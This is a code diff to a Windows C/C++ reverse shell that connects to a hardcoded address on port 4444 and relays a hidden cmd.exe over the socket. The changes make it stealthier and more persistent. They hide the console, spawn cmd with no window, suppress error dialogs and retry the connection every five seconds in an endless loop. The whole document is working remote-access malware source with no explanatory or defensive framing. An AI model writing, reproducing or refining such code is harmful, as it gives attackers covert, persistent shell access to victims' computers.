@@ -2,9 +2,9 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <stdio.h>
-#include <stdlib.h>
-
+#include <ShlObj.h>
 #pragma comment(lib, "Ws2_32.lib")
+#pragma warning(disable: 28251)
 
 DWORD WINAPI ReadFromCmd(LPVOID lpParam)
 {
@@ -44,50 +44,25 @@ DWORD WINAPI WriteToCmd(LPVOID lpParam)
         {
             WriteFile(hStdInWrite, buffer, recvSize, &bytesWritten, NULL);
         }
-        else if (recvSize == 0 || recvSize == SOCKET_ERROR)
+        else
         {
             break;
         }
         Sleep(10);
     }
+
+    ExitProcess(0);
     return 0;
 }
 
-int main()
+void SpawnShell(SOCKET sockt)
 {
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
-    {
-        return 1;
-    }
-
-    SOCKET sockt = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockt == INVALID_SOCKET)
-    {
-        WSACleanup();
-        return 1;
-    }
-
-    sockaddr_in revsockaddr = {};
-    revsockaddr.sin_family = AF_INET;
-    revsockaddr.sin_port = htons(4444);
-    inet_pton(AF_INET, "172.20.10.10", &revsockaddr.sin_addr);
-
-    if (connect(sockt, (sockaddr*)&revsockaddr, sizeof(revsockaddr)) != 0)
-    {
-        closesocket(sockt);
-        WSACleanup();
-        return 1;
-    }
-
     HANDLE hStdInRead = NULL, hStdInWrite = NULL;
     HANDLE hStdOutRead = NULL, hStdOutWrite = NULL;
     SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
 
-    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0))
-        return 1;
-    if (!CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0))
-        return 1;
+    CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);
+    CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0);
 
     STARTUPINFOW si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
@@ -98,30 +73,65 @@ int main()
     si.hStdError = hStdOutWrite;
 
     wchar_t cmd[] = L"cmd.exe";
+    wchar_t desktopPath[MAX_PATH];
+    SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);
 
-    if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+    if (CreateProcessW(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, desktopPath, &si, &pi))
     {
-        closesocket(sockt);
-        WSACleanup();
+        CloseHandle(hStdInRead);
+        CloseHandle(hStdOutWrite);
+
+        HANDLE handles[3] = { (HANDLE)sockt, hStdOutRead, hStdInWrite };
+
+        CreateThread(NULL, 0, ReadFromCmd, handles, 0, NULL);
+        CreateThread(NULL, 0, WriteToCmd, handles, 0, NULL);
+
+        WaitForSingleObject(pi.hProcess, INFINITE);
+
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    CloseHandle(hStdOutRead);
+    CloseHandle(hStdInWrite);
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX); // <-- Prevent error dialogs
+    FreeConsole(); // <-- Hide console if it somehow spawns anyway
+
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         return 1;
     }
 
-    CloseHandle(hStdInRead);
-    CloseHandle(hStdOutWrite);
+    while (true)
+    {
+        SOCKET sockt = socket(AF_INET, SOCK_STREAM, 0);
+        if (sockt == INVALID_SOCKET)
+        {
+            Sleep(5000);
+            continue;
+        }
 
-    HANDLE handles[3] = { (HANDLE)sockt, hStdOutRead, hStdInWrite };
+        sockaddr_in revsockaddr = {};
+        revsockaddr.sin_family = AF_INET;
+        revsockaddr.sin_port = htons(4444);
+        inet_pton(AF_INET, "172.20.10.10", &revsockaddr.sin_addr);
 
-    // Spawn threads
-    CreateThread(NULL, 0, ReadFromCmd, handles, 0, NULL);
-    CreateThread(NULL, 0, WriteToCmd, handles, 0, NULL);
+        if (connect(sockt, (sockaddr*)&revsockaddr, sizeof(revsockaddr)) == 0)
+        {
+            SpawnShell(sockt);
+            closesocket(sockt);
+        }
+        else
+        {
+            closesocket(sockt);
+            Sleep(5000); // wait 5 sec before retry
+        }
+    }
 
-    // Main thread waits for process to exit
-    WaitForSingleObject(pi.hProcess, INFINITE);
-
-    // Cleanup
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    closesocket(sockt);
     WSACleanup();
     return 0;
 }
